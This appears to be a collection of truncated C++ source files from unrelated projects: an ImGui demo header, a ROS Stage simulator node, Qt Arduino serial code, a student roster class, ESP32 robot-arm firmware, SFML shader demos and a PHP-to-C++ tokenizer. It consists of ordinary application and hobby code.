ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio: CTRL+comma (\"Edit.GoToAll\") can follow symbols inside comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - In Visual Studio w/ Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols inside comments.\n// - In VS Code, CLion, etc.: CTRL+click can follow symbols inside comments.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// - ShowDemoWindow()\n// - sub section: ShowDemoWindowWidgets()\n// - sub section: ShowDemoWindowLayout()\n// - sub section: ShowDemoWindowPopups()\n// - sub section: ShowDemoWindowTables()\n// - sub section: ShowDemoWindowInputs()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] User Guide / ShowUserGuide()\n// [SECTION] Example App: Main Menu Bar / ShowExampleAppMainMenuBar()\n// [SECTION] Example App: Debug Console / ShowExampleAppConsole()\n// [SECTION] Example App: Debug Log / ShowExampleAppLog()\n// [SECTION] Example App: Simple Layout / ShowExampleAppLayout()\n// [SECTION] Example App: Property Editor / ShowExampleAppPropertyEditor()\n// [SECTION] Example App:",
    "/*\n *  stageros\n *  Copyright (c) 2008, Willow Garage, Inc.\n *\n *  This program is free software; you can redistribute it and/or modify\n *  it under the terms of the GNU General Public License as published by\n *  the Free Software Foundation; either version 2 of the License, or\n *  (at your option) any later version.\n *\n *  This program is distributed in the hope that it will be useful,\n *  but WITHOUT ANY WARRANTY; without even the implied warranty of\n *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n *  GNU General Public License for more details.\n *\n *  You should have received a copy of the GNU General Public License\n *  along with this program; if not, write to the Free Software\n *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA\n */\n\n/**\n\n@mainpage\n\n@htmlinclude manifest.html\n**/\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <unistd.h>\n#include <signal.h>\n\n\n// libstage\n#include <stage.hh>\n\n\n// roscpp\n#include <ros/ros.h>\n#include <boost/thread/mutex.hpp>\n#include <boost/thread/thread.hpp>\n#include <sensor_msgs/LaserScan.h>\n#include <sensor_msgs/Image.h>\n#include <sensor_msgs/image_encodings.h>\n#include <sensor_msgs/CameraInfo.h>\n#include <nav_msgs/Odometry.h>\n#include <geometry_msgs/Twist.h>\n#include <rosgraph_msgs/Clock.h>\n\n#include <std_srvs/Empty.h>\n\n#include \"tf/transform_broadcaster.h\"\n\n#define USAGE \"stageros <worldfile>\"\n#define IMAGE \"image\"\n#define DEPTH \"depth\"\n#define CAMERA_INFO \"camera_info\"\n#define ODOM \"odom\"\n#define BASE_SCAN \"base_scan\"\n#define BASE_POSE_GROUND_TRUTH \"base_pose_ground_truth\"\n#define CMD_VEL \"cmd_vel\"\n\n// Our node\nclass StageNode\n{\nprivate:\n\n    // roscpp-related bookkeeping\n    ros::NodeHandle n_;\n\n    // A mutex to lock access to fields that are used in message callbacks\n    boost::mutex msg_lock;\n\n    // The models that we're interested in\n    std::vector<Stg::ModelCamera *> cameramodels;\n    std::vector<Stg::ModelRanger *> lasermodels;\n    std::vector<Stg::ModelPosition *> positionmodels;\n\n    //a structure representing a robot inthe simulator\n    struct StageRobot\n    {\n        //stage related models\n        Stg::ModelPosition* positionmodel; //one position\n        std::vector<Stg::ModelCamera *> cameramodels; //multiple cameras per position\n        std::vector<Stg::ModelRanger *> lasermodels; //multiple rangers per position\n\n        //ros publishers\n        ros::Publisher odom_pub; //one odom\n        ros::Publisher ground_truth_pub; //one ground truth\n\n        std::vector<ros::Publisher> image_pubs; //multiple images\n        std::vector<ros::Publisher> depth_pubs; //multiple depths\n        std::vector<ros::Publisher> camera_pubs; //multiple cameras\n        std::vector<ros::Publisher> laser_pubs; //multiple lasers\n\n        ros::Subscriber cmdvel_sub; //one cmd_vel subscriber\n    };\n\n    std::vector<StageRobot const *> robotmodels_;\n\n    // Used to remember initial poses for soft reset\n    std::vector<Stg::Pose> initial_poses;\n    ros::ServiceServer reset_srv_;\n  \n    ros::Publisher clock_pub_;\n    \n    bool isDepthCanonical;\n    bool use_model_names;\n\n    // A helper function that is executed for each stage model.  We use it\n    // to search for models of interest.\n    static void ghfunc(Stg::Model* mod, StageNode* node);\n\n    static bool s_update(Stg::World* world, StageNode* node)\n    {\n        node->WorldCallback();\n        // We return false to indicate that we want to be called again (an\n        // odd convention, but that's the way that Stage works).\n        return false;\n    }\n\n    // Appends the given robot ID to the given message name.  If omitRobotID\n    // is true, an unaltered copy of the name is returned.\n    const char *mapName(const char *name, size_t robotID, Stg::Model* mod) const;\n    const char *mapName(const char *name, size_t robotID, size_t deviceID, Stg::Model* mod) const;\n\n    tf::TransformBroadcaster tf;\n\n    // Last time that we received a velocity command\n    ros::Time base_last_cmd;\n    ros::Duration base_watchdog_timeout;\n\n    // Current simulation time\n    ros::Time sim_time;\n    \n    // Last time we saved global position (for velocity calculation).\n    ros::Time base_last_globalpos_time;\n    // Last published global pose of each robot\n    std::vector<Stg::Pose> base_last_globalpos;\n\npublic:\n    // Constructor; stage itself needs argc/argv.  fname is the .world file\n    // that stage should load.\n    StageNode(int argc, char** argv, bool gui, const char* fname, bool use_model_names);\n    ~StageNode();\n\n    // Subscribe to models of interest.  Currently, we find and subscribe\n    // to the first 'laser' model and the first 'position' model.  Returns\n    // 0 on success (both models subscribed), -1 otherwise.\n    int SubscribeModels();\n\n    // Our callback\n    void WorldCallback();\n    \n    // Do one update of the world.  May pause if the next update time\n    // has not yet arrived.\n    bool UpdateWorld();\n\n    // Message callb",
    "#include \"arduino.h\"\n#include <QString>\n#include \"connection.h\"\n#include <QDate>\n#include <QDateTime>\n\nArduino::Arduino()\n{\n    data=\"\";\n    arduino_port_name=\"\";\n    arduino_is_available=false;\n    serial=new QSerialPort;\n}\n\nQString Arduino::getarduino_port_name()\n{\n    return arduino_port_name;\n}\n\nQSerialPort *Arduino::getserial()\n{\n   return serial;\n}\nint Arduino::connect_arduino()\n{   // recherche du port sur lequel la carte arduino identif\u00e9e par  arduino_uno_vendor_id\n    // est connect\u00e9e\n    foreach (const QSerialPortInfo &serial_port_info, QSerialPortInfo::availablePorts()){\n           if(serial_port_info.hasVendorIdentifier() && serial_port_info.hasProductIdentifier()){\n               if(serial_port_info.vendorIdentifier() == arduino_uno_vendor_id && serial_port_info.productIdentifier()\n                       == arduino_uno_producy_id) {\n                   arduino_is_available = true;\n                   arduino_port_name=serial_port_info.portName();\n               } } }\n        qDebug() << \"arduino_port_name is :\" << arduino_port_name;\n        if(arduino_is_available){ // configuration de la communication ( d\u00e9bit...)\n            serial->setPortName(arduino_port_name);\n            if(serial->open(QSerialPort::ReadWrite)){\n                serial->setBaudRate(QSerialPort::Baud9600); // d\u00e9bit : 9600 bits/s\n                serial->setDataBits(QSerialPort::Data8); //Longueur des donn\u00e9es : 8 bits,\n                serial->setParity(QSerialPort::NoParity); //1 bit de parit\u00e9 optionnel\n                serial->setStopBits(QSerialPort::OneStop); //Nombre de bits de stop : 1\n                serial->setFlowControl(QSerialPort::NoFlowControl);\n                return 0;\n            }\n            return 1;\n        }\n        return -1;\n}\n\nint Arduino::close_arduino()\n\n{\n\n    if(serial->isOpen()){\n            serial->close();\n            return 0;\n        }\n    return 1;\n\n\n}\n\n\n\nQByteArray Arduino::read_from_arduino()\n{\n    QByteArray data;\n    while (serial->waitForReadyRead()) {\n        data.append(serial->read(1));\n        if (data.endsWith('\\n')) {\n            return data.trimmed();\n        }\n    }\n    return QByteArray();\n}\n\n\nint Arduino::write_to_arduino( QByteArray d)\n{\n\n    if(serial->isWritable()){\n        serial->write(d);  // envoyer des donn\u00e9s vers Arduino\n    }else{\n        qDebug() << \"Couldn't write to serial!\";\n    }\n\n\n}\n\n\nQSerialPort serial;\n\nvoid Arduino::add_temp(QString temp)\n{\n    QSqlQuery query;\n\n    QString SqlQuery = \"insert into TEMPERATURE VALUES (:temp,:time)\";\n    query.prepare(SqlQuery);\n\n    query.bindValue(\":temp\",temp);\n\n\n\n    // Get the current system date and time\n    QDateTime currentDateTime = QDateTime::currentDateTime();\n\n    // Print the current date and time in the format \"yyyy-MM-dd hh:mm:ss\"\n    QString dateTimeString = currentDateTime.toString(Qt::ISODate);\n    qDebug() << \"Current date and time:\" << dateTimeString;\n\n\n\n\n    query.bindValue(\":time\",dateTimeString);\n\n    query.exec();\n    qDebug() << \"Element added\";\n}\n\n\nQSqlQueryModel *Arduino :: afficher_temperature()\n{\n    QSqlQueryModel * model=new QSqlQueryModel();\n\n    model->setQuery(\"SELECT * FROM TEMPERATURE\");\n    model->setHeaderData(0,Qt::Horizontal,QObject::tr(\"TEMP \"));\n    model->setHeaderData(1,Qt::Horizontal,QObject::tr(\"TIME\"));\n\n    return model;\n}\n",
    "//\n//  student.cpp\n//  ClassRoster2\n//\n//  Created by Parvaty Chery on 2024-04-23.\n//\n\n#include \"student.hpp\" //include the student header file\n#include <iostream>\nusing namespace std;\n\n\n\nStudent::Student(){/*The constructor is used to initialize the variables to defaul values*/\n    \n    this->studentID = \"\"; /*this initializes the student ID to empty string*/\n    this->firstName = \"\"; /*this initializes the student's first name to empty string*/\n    this->lastName = \"\"; /*initializes the student's last name to empty string*/\n    this->emailAddress = \"\"; /*initializes the student's email to empty strings*/\n    this->age = 0; /*initializes student's age to 0*/\n    for (int i = 0; i < daysArray; i++) this->numDays[i] = 0;/*loops throught the array and initializes each element to 0*/\n    this->degreeProgram = DegreeProgram::SECURITY; /*initializes the degree program type to SECURITY*/\n    }\n    \n\n\nStudent::Student(string studentID, string firstName, string lastName, string emailAddress, int age, int numDays[], DegreeProgram degreeProgram){\n    \n    this->studentID = studentID;\n    this->firstName = firstName;\n    this->lastName = lastName;\n    this->emailAddress = emailAddress;\n    this->age = age;\n    for (int i = 0; i < daysArray; i++) this->numDays[i] = numDays[i];\n    this->degreeProgram = degreeProgram;\n}/* In this section, the constructor initialize the variables with the provided values*/\n    \nStudent::~Student(){}\n/*the destructor- even if does nothing dynamically in this case, still need to add it*/\n    \n    //accessors- they will retrieve the values of the member variables\n    \n    string Student::getStudentID() {return this->studentID;} /*returns student id*/\n    string Student::getFirstName()  {return this->firstName;} /*returns first name*/\n    string Student::getLastName() {return this->lastName;}/*returns last name*/\n    string Student::getEmailAddress() {return this-> emailAddress;} /*returns email address*/\n    int Student::getAge(){return this->age;}/*returns age*/\n    int* Student::getNumDays(){return this->numDays;}/*returns the pointer to the array of days spent in each course*/\n    DegreeProgram Student::getDegreeProgram(){return this->degreeProgram;}/*this returns the degree program*/\n    \n    //end of accessors\n\n\n  //beginning of setters or mutators to modidy the values of each variable\n\nvoid Student::setStudentID(string ID){this->studentID = ID;} /*sets the student's id*/\nvoid Student::setFirstName(string firstName){this->firstName = firstName;}/*sets the student first name*/\nvoid Student::setLastName(string lastName){this->lastName = lastName;} /*sets the student's last name*/\nvoid Student::setEmailAddress(string emailAddress){this->emailAddress = emailAddress;} /*sets the student's email*/\nvoid Student::setAge(int age){this->age = age;} /*sets the student's age*/\nvoid Student::setNumDays(int numDays[]){ /*sets each number of days separately*/\n    \n    for (int i = 0; i < daysArray; i++) this->numDays[i] = numDays[i];\n}\nvoid Student::setDegreeProgram(DegreeProgram dp){this->degreeProgram = dp;} /*sets the degree program*/\n//end of setters or mutators\n\n\nvoid Student::printHeader(){//prints out the header\n    \n    cout << \"ID\" << \"\\t\" << \"FIRST\" << \"\\t\" << \"LAST\" << \"\\t\" << \"EMAIL ADDRESS\" << \"\\t\" << \"AGE\" << \"\\t\" << \"DAYS IN COURSE\" << \"\\t\" << \"DEGREE PROGRAM\" << endl; //format of printout for the student data\n};\nvoid Student::print()/*this function prints out the data of a student, including their student id, name, email , age and etc.*/\n//numDays are grabbed separately\n{\n    \n    cout << this->getStudentID() << '\\t';\n    cout << this->getFirstName() << '\\t';\n    cout << this->getLastName() << '\\t';\n    cout << this->getEmailAddress() << '\\t';\n    cout << this->getAge() << '\\t';\n    cout << this->getNumDays()[0] << '\\t';\n    cout << this->getNumDays()[1] << '\\t';\n    cout << this->getNumDays()[2] << '\\t';\n    cout << degreeProgramStrings[this->getDegreeProgram()] << '\\n'; //outputs degree program of the student as a string- reference degree header\n    \n};\n    \n\n",
    "#include <Arduino.h>\n#include <WiFi.h>\n#include <WiFiUdp.h>\n#include <ESP32Servo.h>\n\n//plate spin values\n#define PLATE_SPIN_STOP 1500\n#define PLATE_SPIN_MAX 2500\n#define PLATE_SPIN_MIN 1550\n#define TIME_PER_DEGREE 4.16524 //ms per degree aproximation. Should use sensors for accurate tracking\n#define TIME_PER_DEGREE_SLOW 16.61 //ms per degree aproximation when using the slowest speed.\n\n#define UDP_TIMER 10 //timer for udp messages\n#define SERVO_SPEED 50// servo speed in ms\n#define SEND_SENSOR_TIMER 100 //timer for sending sensor data\n#define DEBUG 0     //set to 1 to debug stuff to console\n\n#define DEFAULT_MOVE_SPEED 1    //how many degrees to move, this thing's stopped working as intended, probably the servos went bad. Sometimes when it's at position 90, and the target is 180, trying to write the position + 1 (91) fails to move it.\n\n// Network configuration\nconstexpr char SSID_NAME[] = \"StefanIOT\";\nconstexpr char SSID_PASSWORD[] = \"stefaniot\";\n\n//Default positions for the joints\nint arm_A_pos = 90;   // desired angle for A\nint arm_B_pos = 150;  // desired angle for B\nint arm_C_pos = 90;    // desired angle for C\nint plate_pos = 0;    // desired angle for plate\n\n// Button state management\nbool lastButtonState = HIGH;  // Assume button starts unpressed\nbool servosAttached = false;   // Assume servos start attached\n\n// Servo pin definitions\n#define servo_A 2\n#define servo_B 4\n#define servo_C 25\n#define servo_D 32\n\n#define pot_A 33\n#define pot_B 34\n#define pot_C 35\n\n//sensor pins\n#define trig 26\n#define echo 27\n\n// Button pin\n#define BUTTON_PIN 0\n\n//servo correction value\n#define SERVO_CORRECTION 1\n\n// Supersampling for potentiometer readings\nconstexpr int POT_SAMPLES = 64;\n\n// Function to read from a servo with compensation. \nint readServoCompensated(Servo& servo) {\n    int rawRead = servo.read();  // Get the raw reading\n    int compensatedRead = rawRead + SERVO_CORRECTION;  // Add compensation to the read value\n    return compensatedRead;  // Return the compensated value\n}\n\n// Servo objects\nServo arm_A;        //180 is towards the plate, 0 is away from the plate, this is the head servo\nServo arm_B;        \nServo arm_C;        //180 is towards the plate, 0 is away from the plate\nServo plate;        // takes 2.2 seconds for a full rotation\n\n// Function to attach all servos\nvoid attach_servos() {\n    arm_A.attach(servo_A);\n    arm_B.attach(servo_B);\n    arm_C.attach(servo_C);\n    servosAttached = true;\n    arm_A.write(arm_A_pos);\n    arm_B.write(arm_B_pos);\n    arm_C.write(arm_C_pos);\n}\n\n// Function to detach all servos\nvoid detach_servos() {\n    arm_A.detach();\n    arm_B.detach();\n    arm_C.detach();\n    servosAttached = false;\n}\n\nbool servoPosCheck()\n{\n    int arm_a_temp = readServoCompensated(arm_A);\n    int arm_b_temp = readServoCompensated(arm_B);\n    int arm_c_temp = readServoCompensated(arm_C);\n\n    //Serial.println(\"Servo A: \" + String(arm_A_pos) + \" \" + String(arm_a_temp));\n    //Serial.println(\"Servo B: \" + String(arm_B_pos) + \" \" + String(arm_b_temp));\n    //Serial.println(\"Servo C: \" + String(arm_C_pos) + \" \" + String(arm_c_temp));\n\n    if (arm_A_pos != arm_a_temp ) return false;\n    if (arm_B_pos != arm_b_temp ) return false;\n    if (arm_C_pos != arm_c_temp ) return false;\n\n    return true;\n}\n\n\n\n// UDP communication\nWiFiUDP Udp;\nIPAddress RECEIVER_IP_ADDRESS(10, 126, 56, 116);       //192.168.1.93 10.126.56.116\nconstexpr int RECEIVER_PORT = 50195;\nconstexpr int LOCAL_PORT = 3002;\nString UDPDataString = \"\";\nchar UDPPacketBuffer[255];\n\n// Timing for sensor and actuator updates\nconstexpr int SENSOR_CYCLE_DELAY = 100;\nlong lastSensorCycle = 0;\nconstexpr int ACTUATOR_CYCLE_DELAY = 10;\nlong lastActuatorCycle = 0;\nlong printMilis = 0;\n\n// Potentiometer input\nint potentiometerValue = 0;\n\nbool currentButtonState;\n\nlong readSonar() {\n    digitalWrite(trig, LOW);\n    delayMicroseconds(2);\n    digitalWrite(trig, HIGH);\n    delayMicroseconds(10);\n    digitalWrite(trig, LOW);\n    long duration = pulseIn(echo, HIGH);\n    long distance = duration * 0.034 / 2; // Speed of sound wave divided by 2 (go and return)\n    return distance;    // in cm\n}\n\nvoid button_logic() {\n    currentButtonState = digitalRead(BUTTON_PIN);  // Read the current button state\n    if (currentButtonState == LOW && lastButtonState == HIGH) {\n        // Button was pressed\n        if (servosAttached) {\n            // Detach servos\n            detach_servos();\n            Serial.println(\"Servos detached\");\n        } else {\n            // Attach servos\n            attach_servos();\n            delay(500);  // Ensure servos have time to move to initial position\n        }\n    }\n    lastButtonState = currentButtonState;  // Update the last button state\n}\n\nvoid set_servos_to_angle(int target_A, int target_B, int target_C) {\n    arm_A_pos = target_A;\n    arm_B_pos = target_B;\n    arm_C_pos = target_C;\n}\n\n/*\n\nA:0|B:14|C:8\n\nThis is 0 in unity.\n\nAngled towards the plate the values are A:84 B:120 C:90\n\nAngled away from the plate the values are A: -96 B: -44 ",
    "\n////////////////////////////////////////////////////////////\n// Headers\n////////////////////////////////////////////////////////////\n#include \"Effect.hpp\"\n#include <vector>\n#include <cmath>\n\n\nconst sf::Font* Effect::s_font = NULL;\n\n////////////////////////////////////////////////////////////\n// \"Pixelate\" fragment shader\n////////////////////////////////////////////////////////////\nclass Pixelate : public Effect\n{\npublic:\n\n    Pixelate() :\n    Effect(\"Pixelate\")\n    {\n    }\n\n    bool onLoad()\n    {\n        // Load the texture and initialize the sprite\n        if (!m_texture.loadFromFile(\"resources/background.jpg\"))\n            return false;\n        m_sprite.setTexture(m_texture);\n\n        // Load the shader\n        if (!m_shader.loadFromFile(\"resources/pixelate.frag\", sf::Shader::Fragment))\n            return false;\n        m_shader.setUniform(\"texture\", sf::Shader::CurrentTexture);\n\n        return true;\n    }\n\n    void onUpdate(float, float x, float y)\n    {\n        m_shader.setUniform(\"pixel_threshold\", (x + y) / 30);\n    }\n\n    void onDraw(sf::RenderTarget& target, sf::RenderStates states) const\n    {\n        states.shader = &m_shader;\n        target.draw(m_sprite, states);\n    }\n\nprivate:\n\n    sf::Texture m_texture;\n    sf::Sprite m_sprite;\n    sf::Shader m_shader;\n};\n\n\n////////////////////////////////////////////////////////////\n// \"Wave\" vertex shader + \"blur\" fragment shader\n////////////////////////////////////////////////////////////\nclass WaveBlur : public Effect\n{\npublic:\n\n    WaveBlur() :\n    Effect(\"Wave + Blur\")\n    {\n    }\n\n    bool onLoad()\n    {\n        // Create the text\n        m_text.setString(\"Praesent suscipit augue in velit pulvinar hendrerit varius purus aliquam.\\n\"\n                         \"Mauris mi odio, bibendum quis fringilla a, laoreet vel orci. Proin vitae vulputate tortor.\\n\"\n                         \"Praesent cursus ultrices justo, ut feugiat ante vehicula quis.\\n\"\n                         \"Donec fringilla scelerisque mauris et viverra.\\n\"\n                         \"Maecenas adipiscing ornare scelerisque. Nullam at libero elit.\\n\"\n                         \"Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas.\\n\"\n                         \"Nullam leo urna, tincidunt id semper eget, ultricies sed mi.\\n\"\n                         \"Morbi mauris massa, commodo id dignissim vel, lobortis et elit.\\n\"\n                         \"Fusce vel libero sed neque scelerisque venenatis.\\n\"\n                         \"Integer mattis tincidunt quam vitae iaculis.\\n\"\n                         \"Vivamus fringilla sem non velit venenatis fermentum.\\n\"\n                         \"Vivamus varius tincidunt nisi id vehicula.\\n\"\n                         \"Integer ullamcorper, enim vitae euismod rutrum, massa nisl semper ipsum,\\n\"\n                         \"vestibulum sodales sem ante in massa.\\n\"\n                         \"Vestibulum in augue non felis convallis viverra.\\n\"\n                         \"Mauris ultricies dolor sed massa convallis sed aliquet augue fringilla.\\n\"\n                         \"Duis erat eros, porta in accumsan in, blandit quis sem.\\n\"\n                         \"In hac habitasse platea dictumst. Etiam fringilla est id odio dapibus sit amet semper dui laoreet.\\n\");\n        m_text.setFont(getFont());\n        m_text.setCharacterSize(22);\n        m_text.setPosition(30, 20);\n\n        // Load the shader\n        if (!m_shader.loadFromFile(\"resources/wave.vert\", \"resources/blur.frag\"))\n            return false;\n\n        return true;\n    }\n\n    void onUpdate(float time, float x, float y)\n    {\n        m_shader.setUniform(\"wave_phase\", time);\n        m_shader.setUniform(\"wave_amplitude\", sf::Vector2f(x * 40, y * 40));\n        m_shader.setUniform(\"blur_radius\", (x + y) * 0.008f);\n    }\n\n    void onDraw(sf::RenderTarget& target, sf::RenderStates states) const\n    {\n        states.shader = &m_shader;\n        target.draw(m_text, states);\n    }\n\nprivate:\n\n    sf::Text m_text;\n    sf::Shader m_shader;\n};\n\n\n////////////////////////////////////////////////////////////\n// \"Storm\" vertex shader + \"blink\" fragment shader\n////////////////////////////////////////////////////////////\nclass StormBlink : public Effect\n{\npublic:\n\n    StormBlink() :\n    Effect(\"Storm + Blink\")\n    {\n    }\n\n    bool onLoad()\n    {\n        // Create the points\n        m_points.setPrimitiveType(sf::Points);\n        for (int i = 0; i < 40000; ++i)\n        {\n            float x = static_cast<float>(std::rand() % 800);\n            float y = static_cast<float>(std::rand() % 600);\n            sf::Uint8 r = static_cast<sf::Uint8>(std::rand() % 255);\n            sf::Uint8 g = static_cast<sf::Uint8>(std::rand() % 255);\n            sf::Uint8 b = static_cast<sf::Uint8>(std::rand() % 255);\n            m_points.append(sf::Vertex(sf::Vector2f(x, y), sf::Color(r, g, b)));\n        }\n\n        // Load the shader\n        if (!m_shader.loadFromFile(\"resources/storm.vert\", \"resources/blink.frag\"))\n            return false;\n",
    "/*\n * main.cpp\n *\n *  Created on: Feb 17, 2022\n *      Author: q\n */\n\n#include <iostream>\n#include <cstring>\n#include <fstream>\n#include <libs.h>\n\nusing namespace std;\n\n//string array_reconstruct(Mixed _arr, long _level) {\n//\tstring _tab;\n//\tlong _i;\n//\tstring _k1;\n//\tMixed _e1;\n//\t_tab = \"\";\n//\tfor (_i = 0; _i < _level; _i++)\n//\t\t_tab += \"\\t\";\n//\tfor (auto  [_k1, _e1] : _arr.valueArray) {\n//\t\tif (((Mixed) _e1).type != \"a\")\n//\t\t\t_arr[_k1] = _tab+\"\"\\\"\"+_k1+\"\"\\\" => \\\"_e1\\\"\";\n//\t\telse\n//\t\t\t_arr[_k1] = \"_tab\\\"_k1\\\" => \" + array_reconstruct(_e1, _level + 1);\n//\t}\n//\n//\treturn \"[\" + PHP_EOL + implode(\",\" + PHP_EOL, _arr.valueArray) + PHP_EOL\n//\t\t\t+ _tab + \"]\";\n//}\nMixed array_merge(Mixed _arr, tokens_line _arr1) {\n\tfor (auto [_key, _value] : _arr1) {\n\t\t_arr.push(_value);\n\t}\n\treturn _arr;\n}\n//Mixed array_merge(Mixed _arr, Mixed _arr1) {\n//\tfor (auto [_key, _value] : _arr1.valueArray) {\n//\t\t_arr.push(*((Mixed*) _value));\n//\t}\n//\treturn _arr;\n//}\nbool is_az(string _inp) {\n\tlong _i1;\n\tbool _is_matches;\n\tfor (_i1 = 0; _i1 < strlen(_inp); _i1++) {\n\t\t_is_matches = php_preg_match(\"/[a-zA-Z]/\", php_to_string(_inp.at(_i1)));\n\t\tif (_is_matches)\n\t\t\treturn true;\n\t}\n\treturn false;\n}\nMixed get_1st_ele(Mixed _arr) {\n\ttokens_line1 _ele;\n\t_arr.resetKeys();\n\tif (!_arr.valueArray.empty())\n\t\treturn _arr[0];\n\treturn Mixed();\n}\ntokens_line1 get_last_ele(tokens_line1_arr _arr) {\n\ttokens_line1 _ele;\n\tif (!_arr.empty())\n\t\treturn _arr.rbegin()->second;\n\treturn tokens_line1();\n}\nstring remove_from_string(string _str, long _start, long _stop) {\n\tif (_start >= _stop || _stop > strlen(_str))\n\t\treturn _str;\n\t_str = substr(_str, 0, _start) + \" \" + substr(_str, _stop);\n\treturn _str;\n}\nlong get_first_pos_or_end_of_str(string _content, string _str,\n\t\tlong _start_pos) {\n\tlong _pos_end;\n\t_pos_end = strpos(_content, _str, _start_pos);\n\tif (_pos_end == -1)\n\t\t_pos_end = strlen(_content);\n\telse\n\t\t_pos_end += strlen(_str);\n\treturn _pos_end;\n}\nstring remove_comment_blocks(string _content) {\n\tlong _len;\n\tlong _i;\n\tlong _last_pos;\n\t_len = strlen(_content);\n\t_i = 0;\n\twhile (_i < _len - 1) {\n\t\tif (ts(_content.at(_i)) + ts(_content.at(_i + 1)) == \"/*\") {\n\t\t\t_last_pos = get_first_pos_or_end_of_str(_content, \"*/\", _i);\n\t\t\t_content = remove_from_string(_content, _i, _last_pos);\n\t\t\t_len = strlen(_content);\n\t\t}\n\t\t_i++;\n\t}\n\treturn _content;\n}\nstring remove_inline_comments(string _content) {\n\tarr_ls _arr;\n//\tlong _k;\n\tstring _v;\n\tlong _pos;\n\t_arr = explode(\"\\n\", _content);\n\tfor (auto [_k, _v] : _arr) {\n\t\tif ((_pos = strpos((string) _v, \"//\")) != -1)\n\t\t\t_arr[_k] = substr((string) _v, 0, _pos);\n\t}\n\treturn implode(\"\\n\", _arr);\n}\nstring remove_comments(string _content) {\n\t_content = remove_inline_comments(_content);\n\t_content = remove_comment_blocks(_content);\n\treturn _content;\n}\nstring rtrim_all_lines(string _content) {\n\tarr_ls _arr;\n//\tlong _k;\n\tstring _v;\n\t_arr = explode(\"\\n\", _content);\n\tfor (auto [_k, _v] : _arr) {\n\t\t_arr[_k] = rtrim(_v);\n\t}\n\treturn implode(\"\\n\", _arr);\n}\ntokens_line1_arr rtrim_all_lines_arr(tokens_line1_arr _content) {\n//\tlong _k0;\n\ttokens_line1 _line;\n//\tlong _k1;\n\ttoken _token;\n\tlong _kx;\n\tfor (auto [_k0, _line] : _content) {\n\t\tfor (auto [_k1, _token] : ((tokens_line1) _line)._0) {\n\t\t\tif (_token._1 != \"spaces\") {\n\t\t\t\t_kx = _k1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t_content[_k0]._0 = array_slice(((tokens_line1) _line)._0, _kx,\n\t\t\t\t\tgt_sizeof(((tokens_line1) _line)._0));\n\t\t}\n\t}\n\treturn _content;\n}\nstring tokens_arr_to_str1(tokens_line _tokens_line1_arr) {\n\tstring _return;\n\ttoken _token;\n\t_return = \"\";\n\tfor (auto [_key_rtt, _token] : _tokens_line1_arr) {\n\t\t_return += _token._0;\n\t}\n\treturn _return;\n}\ntokens_line_arr explode_tokens(token _del, tokens_line _tokens_line1_arr) {\n\ttokens_line_arr _return;\n\tlong _k;\n\ttoken _token;\n\t_return = { { 0, { } } };\n\t_k = 0;\n\tfor (auto [_key_rtt, _token] : _tokens_line1_arr) {\n\t\tif ((token) _token == _del) {\n\t\t\t_k++;\n\t\t\t_return[_k] = { };\n\t\t} else {\n\t\t\tarray_push(_return[_k], _token);\n\t\t}\n\t}\n\treturn _return;\n}\ntokens_line_arr explode_tokens(string _del, tokens_line _tokens_line1_arr) {\n\ttokens_line_arr _return;\n\tlong _k;\n\ttoken _token;\n\t_return = { { 0, { } } };\n\t_k = 0;\n\tfor (auto [_key_rtt, _token] : _tokens_line1_arr) {\n\t\tif (_token._0 == _del) {\n\t\t\t_k++;\n\t\t\t_return[_k] = { };\n\t\t} else {\n\t\t\tarray_push(_return[_k], _token);\n\t\t}\n\t}\n\treturn _return;\n}\narr_ll array_search_multi(token _search, tokens_line _arr) {\n\tarr_ll _return;\n//\tlong _k;\n\ttoken _v;\n\t_return = { };\n\tfor (auto [_k, _v] : _arr) {\n\t\tif (_search == _v)\n\t\t\tarray_push(_return, _k);\n\t}\n\treturn _return;\n}\n\ntokens_line remove_spaces_from_tokens_arr(tokens_line _tokens_line1_arr) {\n\ttokens_line _return;\n\ttoken _token;\n\t_return = { };\n\tfor (auto [_key_rtt, _token] : _tokens_line1_arr) {\n\t\tif ((_token._1 != \"\") && _token._1 != \"spaces\")\n\t\t\tarray_push(_return, _token);\n\t}\n\treturn _return;\n}\nMixed remove_spaces_from_tokens_arr(Mixed _tokens_line1_arr) {\n\tMixed _return;\n\tfor (auto [_key_rtt, _token] : _tokens_line1_arr.valueArray) {\n\t\tif (!(_token[1] == \"\") && !(_token[1] == \"spac",
